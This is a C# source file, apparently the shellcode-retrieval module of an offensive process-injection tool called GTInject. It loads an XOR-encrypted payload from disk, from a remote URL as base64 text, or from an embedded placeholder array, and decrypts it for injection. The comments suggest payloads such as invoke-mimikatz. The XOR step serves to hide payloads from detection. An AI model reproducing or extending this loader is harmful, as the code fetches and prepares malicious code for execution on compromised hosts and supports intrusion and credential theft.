using System;
using System.IO;
using System.Globalization;


namespace GTInject.GetShellcode
{
    internal class GetShellcode
    {

        // Use this to get shellcode, either by embedding yours here, retrieving from a URL, or retrieving from on disk
        // URL and on disk should require at least a single byte XOR

        // Template embedded shellcode should be burn lazy people, like MSF Exec invoke-mimikatz or something


        public static byte[] readAndDecryptBytes(string binLocation, string bytePath, string xorkey)
        {
            // This routine will ID where the bytes live, pull them into the program, and decrypt them for further use. 

            byte[] embeddedShellcode = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00 }; // Replace me with your shellcode if embedding shellcode into the tooling


            var byteSource = Enum.TryParse<Inject.sourceLocation>(binLocation, true, out var enumresult);
            if (!(byteSource))
            {
                Console.WriteLine(" [-] Bad Location defined, needs to be embedded, url, or disk, then specify the path to that location");
                return null;
            }
            else if (binLocation.ToLower() == "disk")
            {
                byte[] encryptedBytes = File.ReadAllBytes(bytePath);
                byte[] decryptedBytes = xorfunction(encryptedBytes, xorkey);
                return decryptedBytes;

            }
            else if (binLocation.ToLower() == "url")
            {
                try
                {
                    Uri.IsWellFormedUriString(bytePath, UriKind.RelativeOrAbsolute);
                    var wc = new System.Net.WebClient();
                    var resp = wc.DownloadString(bytePath);
                    byte[] encryptedBytes = Convert.FromBase64String(resp);
                    byte[] decryptedBytes = xorfunction(encryptedBytes, xorkey);
                    return decryptedBytes;

                }
                catch
                {
                    Console.WriteLine(" URL wasn't properly defined, should be something like https://example.com/base64AndXordPayload");
                    return null;
                }

            }
            else // use embbeded
            {
                byte[] decryptedBytes = xorfunction(embeddedShellcode, xorkey);
                return decryptedBytes;
            }
        }

        private static byte[] xorfunction(byte[] xorBytes, string xorkey)
        {
            Console.WriteLine( " Decrypting Byte Array");
            byte[] decBytes = new byte[xorBytes.Length];
            char[] secretKey = xorkey.ToCharArray();
            for (int byteIndex = 0; byteIndex < xorBytes.Length; byteIndex++)
            {
                decBytes[byteIndex] = (byte)(xorBytes[byteIndex] ^ secretKey[byteIndex % secretKey.Length]);
            }
            return decBytes;
        }

    }
}
